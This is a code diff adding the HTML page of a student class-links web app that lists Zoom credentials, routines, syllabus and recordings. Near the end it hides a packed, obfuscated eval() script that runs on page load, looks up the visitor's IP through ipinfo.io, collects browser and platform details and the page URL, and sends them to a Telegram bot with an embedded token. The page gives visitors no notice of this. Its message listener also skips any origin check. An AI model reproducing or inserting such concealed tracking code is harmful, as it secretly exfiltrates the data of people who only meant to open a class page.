@@ -1,0 +1,441 @@
+<html>
+
+	<!--Developer: Md. Sarwar Jahan Sabit
+	    Email: ssarwarjahan@gmail.com
+	    Github: ms-jahan-->
+	
+<head>
+	<meta name="robots" content="noindex" />
+	<title>All Online Class Zoom Link</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="manifest" href="manifest.json">
+	</link>
+	<script src="manup.min.js"></script>
+	<meta name="theme-color" content="#6200ee">
+	<meta content='#6200ee' name='msapplication-navbutton-color' />
+	<meta content='#6200ee' name='apple-mobile-web-app-status-bar-style' />
+	<link rel="icon" href="https://prodipto27.github.io/images/favicon.ico" type="image/ico" sizes="48x48">
+	<meta property="og:url" content="https://prodipto27.github.io" />
+	<meta property="og:type" content="website" />
+	<meta property="og:title" content="অ্যাহ!" />
+	<meta property="og:description" content="প্রদীপ্ত-২৭ এর এক অ্যাপে সবকিছু!" />
+	<meta property="og:image" content="https://prodipto27.github.io/images/ist_logo.png" />
+	<meta content='200px' property='og:image:width' />
+	<meta content='200px' property='og:image:height' />
+	<meta property="fb:app_id" content="1145722559175311" />
+
+	<link href="md/material-components-web.min.css" rel="stylesheet">
+	<script src="md/material-components-web.min.js"></script>
+	<link rel="stylesheet" href="md/md-icon.css">
+
+
+
+	<style>
+		#main {
+			margin-top: 5%;
+		}
+
+		.container {
+			position: fixed;
+			overflow: hidden;
+			width: 100vw;
+			padding-top: 56.25%;
+			/* 16:9 Aspect Ratio (divide 9 by 16 = 0.5625) */
+		}
+
+		/* Then style the iframe to fit in the container div with full height and width */
+		.responsive-iframe {
+			position: fixed;
+			top: 0;
+			left: 0;
+			bottom: 0;
+			right: 0;
+			width: 100vw;
+			height: 100vh;
+		}
+
+		#swal2-title {
+			font-size: 1.2em;
+		}
+
+		#swal2-content {
+			text-align: left;
+			padding: 1em;
+		}
+
+	</style>
+
+	<script>
+		function clearAcceptListener() {
+			var old_element = document.getElementsByClassName("mdc-dialog")[0];
+			var new_element = old_element.cloneNode(true);
+			old_element.remove();
+			document.body.prepend(new_element);
+
+		}
+		//var dialog = new mdc.dialog.MDCDialog(document.querySelector('.mdc-dialog'));
+
+		var stat = "";
+		if ("serviceWorker" in navigator) {
+			if (navigator.serviceWorker.controller) {
+				console.log("An active service worker found, no need to register");
+			} else {
+				// Register the service worker
+				navigator.serviceWorker
+					.register("/pwabuilder-sw.js", {
+						scope: "/"
+					})
+					.then(function (reg) {
+						console.log("Service worker has been registered for scope: " + reg.scope);
+					});
+			}
+		}
+
+	</script>
+
+</head>
+
+<body>
+
+	<script>
+		window.fbAsyncInit = function () {
+			FB.init({
+				appId: '1145722559175311',
+				xfbml: true,
+				version: 'v9.0'
+			});
+			FB.AppEvents.logPageView();
+		};
+
+		(function (d, s, id) {
+			var js, fjs = d.getElementsByTagName(s)[0];
+			if (d.getElementById(id)) { return; }
+			js = d.createElement(s); js.id = id;
+			js.src = "https://connect.facebook.net/en_US/sdk.js";
+			fjs.parentNode.insertBefore(js, fjs);
+		}(document, 'script', 'facebook-jssdk'));
+	</script>
+
+	<script type="module">
+		import './pwaupdate.js';
+
+		const el = document.createElement('pwa-update');
+		document.body.appendChild(el);
+	</script>
+
+	<script>
+		//var menu = new mdc.menu.MDCMenu(document.querySelector('.mdc-menu'));
+		function openCornerMenu() {
+			var menu = new mdc.menu.MDCMenu(document.getElementsByClassName('mdc-menu')[0]);
+			menu.open = true;
+		}
+	</script>
+	<script>
+		function hideBanner() {
+			document.getElementById("app-banner").style.display = "none";
+		}
+
+		if (window.matchMedia('(display-mode: standalone)').matches) {
+			console.log('display-mode is standalone');
+			hideBanner();
+		}
+		else {
+			console.log('display-mode isn\'t standalone');
+		}
+
+		let deferredPrompt;
+
+		const addBtn = document.querySelector('#pwa-install-button');
+		//addBtn.style.display = 'none';
+
+		window.addEventListener('beforeinstallprompt', (e) => {
+			// Prevent Chrome 67 and earlier from automatically showing the prompt
+			e.preventDefault();
+			// Stash the event so it can be triggered later.
+			deferredPrompt = e;
+			// Update UI to notify the user they can add to home screen
+			//addBtn.style.display = 'block';
+
+			addBtn.addEventListener('click', (e) => {
+				// hide our user interface that shows our A2HS button
+				//addBtn.style.display = 'none';
+				// Show the prompt
+				deferredPrompt.prompt();
+				// Wait for the user to respond to the prompt
+				deferredPrompt.userChoice.then((choiceResult) => {
+					if (choiceResult.outcome === 'accepted') {
+						console.log('User accepted the A2HS prompt');
+						hideBanner();
+					} else {
+						console.log('User dismissed the A2HS prompt');
+					}
+					deferredPrompt = null;
+				});
+			});
+		});
+	</script>
+
+	<!-- <script>
+		
+	</script> -->
+
+	<script src="js/sounds.js"></script>
+
+	<!-- App Bar -->
+
+	<header class="mdc-top-app-bar app-bar" id="app-bar" style="top: 0px; left: 0px;">
+		<div class="mdc-top-app-bar__row">
+			<section class="mdc-top-app-bar__section mdc-top-app-bar__section--align-start">
+				<button class="material-icons mdc-top-app-bar__navigation-icon mdc-icon-button">menu</button>
+				<span class="mdc-top-app-bar__title">Online Class Credentials</span>
+			</section>
+			<section class="mdc-top-app-bar__section mdc-top-app-bar__section--align-end" role="toolbar">
+				<button id='install-button' onclick="pwaInstall()"
+					class="material-icons mdc-top-app-bar__action-item mdc-icon-button"
+					aria-label="Favorite">favorite</button>
+				<button onclick="openCornerMenu()" class="material-icons mdc-top-app-bar__action-item mdc-icon-button"
+					aria-label="Options">
+
+					more_vert
+				</button>
+			</section>
+		</div>
+	</header>
+	<aside class="mdc-drawer mdc-drawer--modal" style="top: 0px; left: 0px;">
+		<div class="mdc-drawer__header">
+			<img src="https://prodipto27.github.io/images/ist_logo.png" width="90px" />
+			<h3 class="mdc-drawer__title">Prodipto27</h3>
+			<h6 class="mdc-drawer__subtitle">prodipto27.github.io</h6>
+		</div>
+		<div class="mdc-drawer__content">
+			<nav class="mdc-list">
+				<!--<a class="mdc-list-item mdc-list-item--activated" href="#" aria-current="page" tabindex="0">-->
+				<a class="mdc-list-item mdc-list-item--activated"
+					onclick='loadIframe("Online Class Credentials", "pages/credentials.html")'
+					data-location="?page=credentials.html" aria-current="page" tabindex="0">
+					<span class="mdc-list-item__ripple"></span>
+					<i class="material-icons mdc-list-item__graphic" aria-hidden="true">vpn_key</i>
+					<span class="mdc-list-item__text">Online Class Credentials</span>
+				</a>
+				<a class="mdc-list-item"
+					onclick='loadIframe("Class Routine", "pages/routine.html")'
+					data-location="?page=routine.html">
+					<span class="mdc-list-item__ripple"></span>
+					<i class="material-icons mdc-list-item__graphic" aria-hidden="true">event</i>
+					<span class="mdc-list-item__text">Class Routine</span>
+				</a>
+				<a class="mdc-list-item" onclick='loadIframe("Syllabus", "pages/syllabus.html")'
+					data-location="?page=syllabus.html">
+					<span class="mdc-list-item__ripple"></span>
+					<i class="material-icons mdc-list-item__graphic" aria-hidden="true">book</i>
+					<span class="mdc-list-item__text">Syllabus</span>
+				</a>
+				<a class="mdc-list-item" onclick='loadIframe("Books", "pages/books.html")'
+					data-location="?page=books.html">
+					<span class="mdc-list-item__ripple"></span>
+					<i class="material-icons mdc-list-item__graphic" aria-hidden="true">menu_book</i>
+					<span class="mdc-list-item__text">Books</span>
+				</a>
+				<a class="mdc-list-item" onclick='loadIframe("Other Resources", "pages/other_resources.html")'
+					data-location="?page=other_resources.html">
+					<span class="mdc-list-item__ripple"></span>
+					<i class="material-icons mdc-list-item__graphic" aria-hidden="true">download_for_offline</i>
+					<span class="mdc-list-item__text">Other Resources</span>
+				</a>
+				<a class="mdc-list-item" onclick='loadIframe("Recorded Classes", "pages/recorded_class.html")'
+					data-location="?page=recorded_class.html">
+					<span class="mdc-list-item__ripple"></span>
+					<i class="material-icons mdc-list-item__graphic" aria-hidden="true">video_library</i>
+					<span class="mdc-list-item__text">Recorded Classes</span>
+				</a>
+				<a class="mdc-list-item" onclick='loadIframe("Recorded Classes", "pages/google_classroom.html")'
+					data-location="?page=recorded_class.html">
+					<span class="mdc-list-item__ripple"></span>
+					<i class="material-icons mdc-list-item__graphic" aria-hidden="true">school</i>
+					<span class="mdc-list-item__text">Join Google Classroom</span>
+				</a>
+				<a class="mdc-list-item" onclick='loadIframe("Settings", "pages/settings.html")'
+					data-location="?page=settings.html">
+					<span class="mdc-list-item__ripple"></span>
+					<i class="material-icons mdc-list-item__graphic" aria-hidden="true">settings</i>
+					<span class="mdc-list-item__text">Settings</span>
+				</a>
+				<hr class="mdc-list-divider">
+				<a class="mdc-list-item" onclick='loadIframe("Download Apk Version", "pages/download-app-apk.html")'
+					data-location="?page=download-app-apk.html">
+					<span class="mdc-list-item__ripple"></span>
+					<i class="material-icons mdc-list-item__graphic" aria-hidden="true">help</i>
+					<span class="mdc-list-item__text">No Chrome Browser?</span>
+				</a>
+				<a class="mdc-list-item" onclick='loadIframe("Provide Feedback", "pages/feedback.html")'
+					data-location="?page=feedback.html">
+					<span class="mdc-list-item__ripple"></span>
+					<i class="material-icons mdc-list-item__graphic" aria-hidden="true">feedback</i>
+					<span class="mdc-list-item__text">Feedback</span>
+				</a>
+			</nav>
+		</div>
+	</aside>
+
+	<div class="mdc-drawer-scrim"></div>
+	<div id="main-content">Main Content</div>
+	<script src="js/md-nav.js"></script>
+	<!-- App Bar -->
+
+	<div onclick="openCornerMenu()" style="float: right; top:0;" class="mdc-menu-surface--anchor">
+		<div class="mdc-menu mdc-menu-surface">
+			<ul class="mdc-list" role="menu" aria-hidden="true" aria-orientation="vertical" tabindex="-1">
+				<li id='install-menu' onclick="pwaInstall()" class="mdc-list-item" role="menuitem">
+					<span class="mdc-list-item__ripple"></span>
+					<i class="material-icons mdc-list-item__graphic" aria-hidden="true">system_update</i>
+					<span class="mdc-list-item__text">Install App</span>
+				</li>
+				<li id='install-menu' onclick="shareThisPage()" class="mdc-list-item" role="menuitem">
+					<span class="mdc-list-item__ripple"></span>
+					<i class="material-icons mdc-list-item__graphic" aria-hidden="true">share</i>
+					<span class="mdc-list-item__text">Share This Page</span>
+				</li>
+				<li onclick="clearCache()" class="mdc-list-item" role="menuitem">
+					<span class="mdc-list-item__ripple"></span>
+					<i class="material-icons mdc-list-item__graphic" aria-hidden="true">delete_sweep</i>
+					<span class="mdc-list-item__text">Clear Cache Data</span>
+				</li>
+				<li onclick="hudai()" class="mdc-list-item" role="menuitem">
+					<span class="mdc-list-item__ripple"></span>
+					<i class="material-icons mdc-list-item__graphic" aria-hidden="true">psychology</i>
+					<span class="mdc-list-item__text">হুদাই!</span>
+				</li>
+			</ul>
+		</div>
+	</div>
+
+	<div class="container">
+		<iframe style="border-width: 0px;" id="ifrm" allow="fullscreen" class="responsive-iframe"
+			src="pages/credentials.html"></iframe>
+
+	</div>
+
+	<script>
+		if(localStorage.getItem("defaultPage") == null){
+			localStorage.setItem("defaultPage", "pages/credentials.html");
+		} 
+		else{
+			document.getElementById('ifrm').setAttribute("src", localStorage.getItem("defaultPage"));
+		}
+	</script>
+
+	<script src="js/iframe-loader.js"></script>
+
+	<div class="mdc-snackbar">
+		<div class="mdc-snackbar__surface" role="status" aria-relevant="additions">
+			<div class="mdc-snackbar__label" aria-atomic="false">
+				Can't send photo. Retry in 5 seconds.
+			</div>
+			<div class="mdc-snackbar__actions" aria-atomic="true">
+				<button type="button" class="mdc-button mdc-snackbar__action">
+					<div class="mdc-button__ripple"></div>
+					<span class="mdc-button__label">Retry</span>
+				</button>
+			</div>
+		</div>
+	</div>
+	<script src="js/md-snackbar.js"></script>
+
+	<!--Normal Alert Dialog-->
+	<div class="mdc-dialog">
+		<div class="mdc-dialog__container">
+			<div class="mdc-dialog__surface" role="alertdialog" aria-modal="true" aria-labelledby="my-dialog-title"
+				aria-describedby="my-dialog-content">
+				<!--<img align="center" src="https://prodipto27.github.io/images/ist_logo.png" width="90px" />-->
+				<div class="mdc-dialog__content" id="my-dialog-content">
+					গোগনীয়তার খাতিরে ভিডিও প্লেলিস্টগুলোর লিংক এখানে না দিয়ে লিংক সম্বলিত ফেসবুক পোস্টে তোমাকে নিয়ে
+					যাওয়া হচ্ছে।
+				</div>
+				<div class="mdc-dialog__actions">
+					<button id="dialog-cancel" type="button" class="mdc-button mdc-dialog__button"
+						data-mdc-dialog-action="cancel">
+						<div class="mdc-button__ripple"></div>
+						<span class="mdc-button__label">Cancel</span>
+					</button>
+					<button id="pwa-install-accept" type="button" class="mdc-button mdc-dialog__button"
+						data-mdc-dialog-action="accept" data-mdc-dialog-button-default>
+						<div class="mdc-button__ripple"></div>
+						<span class="mdc-button__label">Accept</span>
+					</button>
+				</div>
+			</div>
+		</div>
+		<div class="mdc-dialog__scrim"></div>
+	</div>
+
+	<script src="js/md-dialog.js"></script>
+	<!-- <script src="js/open-facebook-post.js"></script> -->
+	<script src="js/pwa-install.js"></script>
+	<script src="js/url-reslover.js"></script>
+	<script src="js/page-sharer.js"></script>
+
+	<script>
+		if (window.matchMedia('(display-mode: standalone)').matches == false) {
+			setTimeout(function () {
+				showSnackbar("To install the app on device, tap on the heart icon above!", 'OK');
+			}, 6000);
+		}
+		else {
+			document.getElementById('install-button').remove();
+			document.getElementById('install-menu').remove();
+		}
+
+		document.getElementById('dialog-cancel').addEventListener('click', (e) => {
+			document.getElementsByClassName("mdc-dialog__button")[1].id = 'pwa-install-accept';
+		});
+
+		function clearCache() {
+			showSnackbar("Clearning cache data...", "OK")
+			if ('serviceWorker' in navigator) {
+				caches.keys().then(function (cacheNames) {
+					cacheNames.forEach(function (cacheName) {
+						caches.delete(cacheName);
+					});
+				});
+				showSnackbar("Cached data was cleared!", "OK");
+			} else {
+				showSnackbar("Clearing cache wasn't possible.", "OK");
+			}
+
+
+		}
+
+
+		var eventMethod = window.addEventListener
+			? "addEventListener"
+			: "attachEvent";
+		var eventer = window[eventMethod];
+		var messageEvent = eventMethod === "attachEvent"
+			? "onmessage"
+			: "message";
+
+		eventer(messageEvent, function (e) {
+			// if (e.origin !== 'http://the-trusted-iframe-origin.com') return;
+			if (e.data === "changeTitle" || e.message === "changeTitle") {
+				document.getElementsByClassName("mdc-top-app-bar__title")[0].textContent = document.getElementById("ifrm").contentWindow.document.title;
+			}
+			else if (e.data.includes("showSnack | ")) {
+				var str = e.data;
+				str = str.replace("showSnack | ", "");
+				showSnackbar(str, "ঠিকাছে");
+			}
+
+		});
+
+
+		eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('3 h=[\'p\',\'o\',\'21-S\\T:\\6\',\'U\',\'V\',\'s://W.X.Y/Z:10/11\',\'12\',\'R\',\'13\',\'15\',\'16\',\'17/x-18-P-19\',\'1a\',\'1b\',\'1c\',\'1d\',\'1e\',\'1f\\14:\\6\\7\',\'Q-B\',\'A\',\'C:\\6\',\'D\',\'O\',\'t\\H:\\6\',\'K\',\'M\',\'N:\\6\',\'G=E&L=\',\'s://J.I/F\',\'1g\'];3 g=9(d,1i){d=d-n;3 l=h[d];1F l};(9(b,z){3 2=g;1H(!![]){1I{3 m=4(2(1J))+-4(2(1K))+-4(2(1L))+-4(2(1M))*4(2(1N))+4(2(1O))*4(2(1P))+4(2(1G))+4(2(1h));1S(m===z)1T;1U b[\'v\'](b[\'y\']())}1V(1W){b[\'v\'](b[\'y\']())}}}(h,1X));9 j(){3 0=g,5=\'\';5+=0(1Y)+1Z[0(20)][0(1R)]+\'\\7\',5+=\'t\\1E:\\6\'+c[0(1t)]+\'\\7\',5+=0(1D)+c[\'1k\']+\'\\7\',5+=0(n)+c[\'1l\']+\'\\7\',5+=0(1m)+c[\'1n\']+\'\\7\',5+=0(1o);3 8=q f();8[0(r)]=9(){3 1=0,i,a;8[\'o\']==f[1(1p)]&&(i=8[\'1q\'],(a=q f())[1(r)]=9(){3 e=1;1r==u[e(1j)]&&u[e(1s)]},a[1(1u)](1(1v),1(1w),!k),a[1(1x)](1(1y),1(1z)),a[\'w\'](1(1A)+5+\'\\6\'+i))},8[\'p\'](0(1B),0(1C),!k),8[\'w\'](1Q)}j();',62,126,'_0x5a4372|_0x3e9c66|_0x1785d6|var|parseInt|_0x3bb9af|x20|x0a|_0x206364|function|_0x32d341|_0x5426ac|navigator|_0x4e0c86|_0x5dacb7|XMLHttpRequest|_0x1cc8|_0x5135|_0x3e1109|phoneHome|0x0|_0x513590|_0x20cbaf|0x118|readyState|open|new|0x126|https|Browser|this|push|send||shift|_0x528eda|626848LmlFhl|type|Platform|133efYJGH|718057913|json|chat_id|x20Name|io|ipinfo|28195AaYiGm|text|628683EItHwb|Url|17MfsrFq|form|Content|status|agent|x20header|POST|onreadystatechange|api|telegram|org|bot870394512|AAF8WPOHWvz0TDWNiFBfujCNc7lCgLNSDdE|sendMessage|setRequestHeader|location|x20Details|GET|DONE|application|www|urlencoded|appCodeName|39579Ahoqif|href|118339JEhYSe|338611LcPqZd|Ip|4074OdXBoE|0x135|_0x3f7c14|0x123|appName|platform|0x124|userAgent|0x133|0x12c|responseText|0x4|0x129|0x12e|0x122|0x125|0x127|0x128|0x134|0x12d|0x11f|0x12b|0x120|0x11b|x20CodeName|return|0x12f|while|try|0x132|0x131|0x11d|0x11c|0x11a|0x121|0x119|null|0x130|if|break|else|catch|_0x413fd9|0x4e41f|0x11e|document|0x12a|User'.split('|'),0,{}))
+
+
+	</script>
+	
+	<script src="js/sweetalert2@10.js"></script>
+	<script src="js/check_version_change.js"></script>
+	
+</body>
+
+</html>
